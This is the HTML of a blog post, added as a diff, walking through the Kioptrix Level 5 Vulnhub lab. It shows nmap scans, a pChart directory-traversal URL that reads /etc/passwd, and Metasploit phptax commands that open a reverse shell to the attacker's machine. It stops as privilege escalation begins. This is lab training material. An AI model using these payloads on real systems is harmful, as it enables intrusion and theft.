@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Kioptrix Level 5 Walkthrough - AntuSec</title><meta name="Description" content="Blog de AntuSec, articulos sobre ctfs y ciberseguridad"><meta property="og:url" content="http://localhost:1313/en/kioptrix_level_5/">
+  <meta property="og:site_name" content="AntuSec">
+  <meta property="og:title" content="Kioptrix Level 5 Walkthrough">
+  <meta property="og:description" content="Kioptrix level 5 Setup For the machine to assign an ip you must remove the network adapter and add it again.
+Resolution Vulnerability scanning and analysis I start by doing a scan of the local network with arp-scan to discover the ip of the target machine.
+arp-scan -I eth0 --localnet -I -&gt; indicate the interface --localnet -&gt; we indicate to generate addresses from the interface configuration.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-09-02T00:00:00+00:00">
+    <meta property="article:modified_time" content="2023-09-02T11:24:09+02:00">
+    <meta property="article:tag" content="Walkthrough">
+    <meta property="article:tag" content="Vulnhub">
+    <meta property="article:tag" content="TjNull">
+    <meta property="article:tag" content="OSCP">
+    <meta property="article:tag" content="Easy">
+    <meta property="og:image" content="http://localhost:1313/es/kioptrix_level_5/preimagenKioptrix5.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/es/kioptrix_level_5/preimagenKioptrix5.png">
+  <meta name="twitter:title" content="Kioptrix Level 5 Walkthrough">
+  <meta name="twitter:description" content="Kioptrix level 5 Setup For the machine to assign an ip you must remove the network adapter and add it again.
+Resolution Vulnerability scanning and analysis I start by doing a scan of the local network with arp-scan to discover the ip of the target machine.
+arp-scan -I eth0 --localnet -I -&gt; indicate the interface --localnet -&gt; we indicate to generate addresses from the interface configuration.">
+<meta name="application-name" content="AntuSec">
+<meta name="apple-mobile-web-app-title" content="AntuSec">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/en/kioptrix_level_5/" /><link rel="prev" href="http://localhost:1313/en/kioptrix_level_3/" /><link rel="next" href="http://localhost:1313/en/dc-9/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Kioptrix Level 5 Walkthrough",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/en\/kioptrix_level_5\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "http:\/\/localhost:1313\/es\/kioptrix_level_5\/preimagenKioptrix5.png",
+                            "width":  350 ,
+                            "height":  123 
+                        }],"genre": "posts","keywords": "Walkthrough, Vulnhub, TjNull, OSCP, Easy","wordcount":  864 ,
+        "url": "http:\/\/localhost:1313\/en\/kioptrix_level_5\/","datePublished": "2023-09-02T00:00:00+00:00","dateModified": "2023-09-02T11:24:09+02:00","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/localhost:1313\/images\/avatar.png",
+                    "width":  398 ,
+                    "height":  292 
+                }},"author": {
+                "@type": "Person",
+                "name": "Antu"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'auto';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/en/" title="AntuSec">AntuSec</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/en/posts/"> Posts </a><a class="menu-item" href="/en/tags/"> Tags </a><a class="menu-item" href="/en/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust" aria-hidden="true"></i>
+                </a><a href="javascript:void(0);" class="menu-item language" title="Select Language">
+                    <i class="fa fa-globe" aria-hidden="true"></i>
+                    <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/es/kioptrix_level_5/">Español</option><option value="/en/kioptrix_level_5/" selected>English</option></select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/en/" title="AntuSec">AntuSec</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/en/posts/" title="">Posts</a><a class="menu-item" href="/en/tags/" title="">Tags</a><a class="menu-item" href="/en/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust" aria-hidden="true"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="Select Language">
+                    <i class="fa fa-globe" aria-hidden="true"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/es/kioptrix_level_5/">Español</option><option value="/en/kioptrix_level_5/" selected>English</option></select>
+                </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Kioptrix Level 5 Walkthrough</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/en/" title="Author" rel="author" class="author"><i class="fas fa-user-circle" aria-hidden="true"></i>Antu</a></span>&nbsp;<span class="post-category">included in <a href="/en/categories/vulnhub/"><i class="far fa-folder" aria-hidden="true"></i>Vulnhub</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt" aria-hidden="true"></i>&nbsp;<time datetime="2023-09-02">2023-09-02</time>&nbsp;<i class="fas fa-pencil-alt" aria-hidden="true"></i>&nbsp;864 words&nbsp;
+                <i class="far fa-clock" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/kioptrix_level_5/preimagenKioptrix5.png"
+        data-srcset="/es/kioptrix_level_5/preimagenKioptrix5.png, /es/kioptrix_level_5/preimagenKioptrix5.png 1.5x, /es/kioptrix_level_5/preimagenKioptrix5.png 2x"
+        data-sizes="auto"
+        alt="/es/kioptrix_level_5/preimagenKioptrix5.png"
+        title="/es/kioptrix_level_5/preimagenKioptrix5.png" /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#setup">Setup</a></li>
+    <li><a href="#resolution">Resolution</a>
+      <ul>
+        <li><a href="#vulnerability-scanning-and-analysis">Vulnerability scanning and analysis</a></li>
+        <li><a href="#exploitation">Exploitation</a></li>
+        <li><a href="#privilege-escalation">Privilege escalation</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="kioptrix-level-5">Kioptrix level 5</h1>
+<h2 id="setup">Setup</h2>
+<p>For the machine to assign an ip you must remove the network adapter and add it again.</p>
+<h2 id="resolution">Resolution</h2>
+<h3 id="vulnerability-scanning-and-analysis">Vulnerability scanning and analysis</h3>
+<p>I start by doing a scan of the local network with arp-scan to discover the ip of the target machine.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">arp-scan -I eth0 --localnet
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-I -&gt; indicate the interface 
+</span></span><span class="line"><span class="cl">--localnet -&gt; we indicate to generate addresses from the interface configuration.</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled.png"
+        data-srcset="/es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled.png, /es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled.png 1.5x, /es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled.png 2x"
+        data-sizes="auto"
+        alt="/es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled.png"
+        title="Untitled" width="730" height="190" /></p>
+<p>I get that the ip of my target is 192.168.66.163, so I do a port scan with nmap.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -p- --open  -T5 -n -Pn -vvv 192.168.66.163 -oN Target
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-08-31 15:46 EDT
+</span></span><span class="line"><span class="cl">Initiating ARP Ping Scan at 15:46
+</span></span><span class="line"><span class="cl">Scanning 192.168.66.163 <span class="o">[</span><span class="m">1</span> port<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Completed ARP Ping Scan at 15:46, 0.06s elapsed <span class="o">(</span><span class="m">1</span> total hosts<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Initiating SYN Stealth Scan at 15:46
+</span></span><span class="line"><span class="cl">Scanning 192.168.66.163 <span class="o">[</span><span class="m">65535</span> ports<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Discovered open port 80/tcp on 192.168.66.163
+</span></span><span class="line"><span class="cl">Discovered open port 8080/tcp on 192.168.66.163
+</span></span><span class="line"><span class="cl">Stats: 0:00:10 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing SYN Stealth Scan
+</span></span><span class="line"><span class="cl">SYN Stealth Scan Timing: About 9.90% <span class="k">done</span><span class="p">;</span> ETC: 15:48 <span class="o">(</span>0:01:31 remaining<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Completed SYN Stealth Scan at 15:47, 53.95s elapsed <span class="o">(</span><span class="m">65535</span> total ports<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.66.163
+</span></span><span class="line"><span class="cl">Host is up, received arp-response <span class="o">(</span>0.00015s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Scanned at 2023-08-31 15:46:49 EDT <span class="k">for</span> 54s
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65532</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>, <span class="m">1</span> closed tcp port <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE    REASON
+</span></span><span class="line"><span class="cl">80/tcp   open  http       syn-ack ttl <span class="m">64</span>
+</span></span><span class="line"><span class="cl">8080/tcp open  http-proxy syn-ack ttl <span class="m">64</span>
+</span></span><span class="line"><span class="cl">MAC Address: 00:0C:29:5B:14:9E <span class="o">(</span>VMware<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 54.25 seconds
+</span></span><span class="line"><span class="cl">           Raw packets sent: <span class="m">131110</span> <span class="o">(</span>5.769MB<span class="o">)</span> <span class="p">|</span> Rcvd: <span class="m">50</span> <span class="o">(</span>2.410KB<span class="o">)</span></span></span></code></pre></div></div>
+<p>I notice that ports 80 and 8080 are open, and I perform a second, more specific scan to obtain the version of the services running.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>/home/kali/vulnhub/OSCP/kioptrix_level_5<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nmap -p80,8080 -sCV 192.168.66.163                        
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-08-31 15:49 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.66.163
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.00040s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">80/tcp   open  http    Apache httpd 2.2.21 <span class="o">((</span>FreeBSD<span class="o">)</span> mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8<span class="o">)</span>
+</span></span><span class="line"><span class="cl">8080/tcp open  http    Apache httpd 2.2.21 <span class="o">((</span>FreeBSD<span class="o">)</span> mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: <span class="m">403</span> Forbidden
+</span></span><span class="line"><span class="cl">MAC Address: 00:0C:29:5B:14:9E <span class="o">(</span>VMware<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 30.05 seconds</span></span></code></pre></div></div>
+<p>After reviewing the results I noticed that the version of mod_ssl/2.2.21 is vulnerable but the exploit for this vulnerability does not contain a valid version for FreeBSD apache 2.2.21 so it did not work.</p>
+<p>I then went on to check the web with port 80.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%201.png"
+        data-srcset="/es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%201.png, /es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%201.png 1.5x, /es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%201.png 2x"
+        data-sizes="auto"
+        alt="/es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%201.png"
+        title="Untitled" width="511" height="207" /></p>
+<p>And when I opened the source code of the page I discovered a url address.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%202.png"
+        data-srcset="/es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%202.png, /es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%202.png 1.5x, /es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%202.png 2x"
+        data-sizes="auto"
+        alt="/es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%202.png"
+        title="Untitled" width="616" height="297" /></p>
+<p>When I opened it I discovered the following:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%203.png"
+        data-srcset="/es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%203.png, /es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%203.png 1.5x, /es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%203.png 2x"
+        data-sizes="auto"
+        alt="/es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%203.png"
+        title="Untitled" width="765" height="685" /></p>
+<h3 id="exploitation">Exploitation</h3>
+<p>Searching what phpchart is I found out that it is a php library to display text data graphically.
+Then I searched if there is any vulnerability for this version and I found the following page.
+<a href="https://vk9-sec.com/exploiting-pchart-2-1-3-directory-traversal-xss/" target="_blank" rel="noopener noreffer ">Exploiting pChart 2.1.3 (Directory traversal &amp; XSS)</a></p>
+<p>Reading I see that it is vulnerable to directory traversal so I enter the following address and get the /etc/passwd file</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://192.168.66.163/pChart2.1.3/examples/index.php?Action<span class="o">=</span>View<span class="p">&amp;</span><span class="nv">Script</span><span class="o">=</span>/../../../../etc/passwd</span></span></code></pre></div></div>
+<p>Reading a little more the web I discover that FreeBSD operating systems have the Apache configuration file in the following path, so I will read it now.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/usr/local/etc/apache22/httpd.conf</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%204.png"
+        data-srcset="/es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%204.png, /es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%204.png 1.5x, /es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%204.png 2x"
+        data-sizes="auto"
+        alt="/es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%204.png"
+        title="Untitled" width="1193" height="806" /></p>
+<p>Observing the result and after trying a log poison without success I see that the configuration file shows an allowed User-Agent (Mozilla/4.0 Mozilla4 browser) and a virtualHost on port 8080.</p>
+<p>Through a browser extension I change the user agent</p>
+<p><a href="https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher-revived/" target="_blank" rel="noopener noreffer ">https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher-revived/</a></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%205.png"
+        data-srcset="/es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%205.png, /es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%205.png 1.5x, /es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%205.png 2x"
+        data-sizes="auto"
+        alt="/es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%205.png"
+        title="Untitled" width="639" height="603" /></p>
+<p>With the user agent changed I perform the web search with port 8080 and I see the following.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%206.png"
+        data-srcset="/es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%206.png, /es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%206.png 1.5x, /es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%206.png 2x"
+        data-sizes="auto"
+        alt="/es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%206.png"
+        title="Untitled" width="580" height="202" /></p>
+<p>I click on phptax and the following page appears.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%207.png"
+        data-srcset="/es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%207.png, /es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%207.png 1.5x, /es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%207.png 2x"
+        data-sizes="auto"
+        alt="/es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%207.png"
+        title="Untitled" width="807" height="753" /></p>
+<p>Searching for an exploit for phptax I find the following exploits</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%208.png"
+        data-srcset="/es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%208.png, /es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%208.png 1.5x, /es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%208.png 2x"
+        data-sizes="auto"
+        alt="/es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%208.png"
+        title="Untitled" width="559" height="148" /></p>
+<p>I have decided to use metasploit so by executing the following series of commands I get a shell.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#start  metasploit</span>
+</span></span><span class="line"><span class="cl">msfconsole -q
+</span></span><span class="line"><span class="cl"><span class="c1">#exploit search</span>
+</span></span><span class="line"><span class="cl">search phptax
+</span></span><span class="line"><span class="cl"><span class="c1">#select exploit</span>
+</span></span><span class="line"><span class="cl">use <span class="m">0</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#setup</span>
+</span></span><span class="line"><span class="cl">options
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> RHOSTS 192.168.66.163
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> RPORT <span class="m">8080</span>
+</span></span><span class="line"><span class="cl">show advanced
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> UserAgent Mozilla/4.0 Mozilla4_browser
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> payload payload/cmd/unix/reverse
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> LHOST 192.168.66.152
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> LPORT <span class="m">4444</span>
+</span></span><span class="line"><span class="cl">run</span></span></code></pre></div></div>
+<h3 id="privilege-escalation">Privilege escalation</h3>
+<p>We obtain a shell and enumerate.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">www
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span>
+</span></span><span class="line"><span class="cl">uname -a
+</span></span><span class="line"><span class="cl">FreeBSD kioptrix2014 9.0-RELEASE FreeBSD 9.0-RELEASE <span class="c1">#0: Tue Jan  3 07:46:30 UTC 2012     root@farrell.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  amd64</span></span></span></code></pre></div></div>
+<p>After enumerating a little bit the next step I did was to search if there is any exploit for the FreeBSD version of the machine.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%209.png"
